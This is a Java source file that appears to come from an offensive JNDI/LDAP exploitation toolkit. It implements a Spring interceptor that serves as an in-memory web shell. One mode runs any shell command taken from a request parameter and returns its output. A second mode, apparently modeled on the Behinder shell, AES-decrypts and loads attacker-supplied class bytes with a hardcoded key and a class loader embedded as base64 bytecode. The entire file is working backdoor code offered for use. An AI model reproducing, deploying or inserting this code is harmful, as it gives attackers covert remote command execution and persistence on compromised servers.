package com.feihong.ldap.template;

import org.springframework.stereotype.Controller;
import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;
import sun.misc.BASE64Decoder;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.File;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Scanner;

@Controller
public class DynamicInterceptorTemplate extends HandlerInterceptorAdapter {

    private Class myClassLoaderClazz;
    private String basicCmdShellPwd = "pass";
    private String behinderShellHeader = "X-Options-Ai";
    private String behinderShellPwd = "e45e329feb5d925b"; // rebeyond

    public DynamicInterceptorTemplate() {
        initialize();
    }

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        System.out.println("[+] Dynamic Interceptor says hello");

        if(request.getParameter("type") != null && request.getParameter("type").equals("basic")){
            //basic cmd shell
            String cmd = request.getParameter(basicCmdShellPwd);
            if(cmd != null && !cmd.isEmpty()){
                String[] cmds = null;
                if(File.separator.equals("/")){
                    cmds = new String[]{"/bin/sh", "-c", cmd};
                }else{
                    cmds = new String[]{"cmd", "/C", cmd};
                }
                String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
                response.getWriter().println(result);

                return false;
            }
        }else if(request.getHeader(behinderShellHeader) != null){
            //behind3 shell
            try{
                if (request.getMethod().equals("POST")){
                    String k = behinderShellPwd;
                    request.getSession().setAttribute("u",k);
                    Cipher cipher = Cipher.getInstance("AES");
                    cipher.init(2, new SecretKeySpec((request.getSession().getAttribute("u") + "").getBytes(), "AES"));
                    byte[] evilClassBytes = cipher.doFinal(new BASE64Decoder().decodeBuffer(request.getReader().readLine()));
                    Class evilClass = (Class) myClassLoaderClazz.getDeclaredMethod("defineClass", byte[].class, ClassLoader.class).invoke(null, evilClassBytes, Thread.currentThread().getContextClassLoader());
                    Object evilObject = evilClass.newInstance();
                    Method targetMethod = evilClass.getDeclaredMethod("equals", new Class[]{ServletRequest.class, ServletResponse.class});
                    targetMethod.invoke(evilObject, new Object[]{request, response});
                }
            }catch(Exception e){
                e.printStackTrace();
            }

            return false;
        }

        return true;
    }

    private void initialize(){
        try{
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            try{
                this.myClassLoaderClazz = classLoader.loadClass("com.feihong.ldap.template.MyClassLoader");
            } catch (ClassNotFoundException e) {
                String code = "yv66vgAAADIAGwoABQAWBwAXCgACABYKAAIAGAcAGQEABjxpbml0PgEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAClMY29tL2ZlaWhvbmcvbGRhcC90ZW1wbGF0ZS9NeUNsYXNzTG9hZGVyOwEAAWMBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAC2RlZmluZUNsYXNzAQAsKFtCTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspTGphdmEvbGFuZy9DbGFzczsBAAVieXRlcwEAAltCAQALY2xhc3NMb2FkZXIBAApTb3VyY2VGaWxlAQASTXlDbGFzc0xvYWRlci5qYXZhDAAGAAcBACdjb20vZmVpaG9uZy9sZGFwL3RlbXBsYXRlL015Q2xhc3NMb2FkZXIMAA8AGgEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAFyhbQklJKUxqYXZhL2xhbmcvQ2xhc3M7ACEAAgAFAAAAAAACAAAABgAHAAEACAAAADoAAgACAAAABiortwABsQAAAAIACQAAAAYAAQAAAAQACgAAABYAAgAAAAYACwAMAAAAAAAGAA0ADgABAAkADwAQAAEACAAAAEQABAACAAAAELsAAlkrtwADKgMqvrYABLAAAAACAAkAAAAGAAEAAAAIAAoAAAAWAAIAAAAQABEAEgAAAAAAEAATAA4AAQABABQAAAACABU=";
                byte[] bytes = new BASE64Decoder().decodeBuffer(code);

                Method method = null;
                try {
                    method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    method.setAccessible(true);
                    this.myClassLoaderClazz = (Class) method.invoke(classLoader, bytes, 0, bytes.length);
                } catch (NoSuchMethodException ex) {
                    ex.printStackTrace();
                }
            }
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        }
    }
}
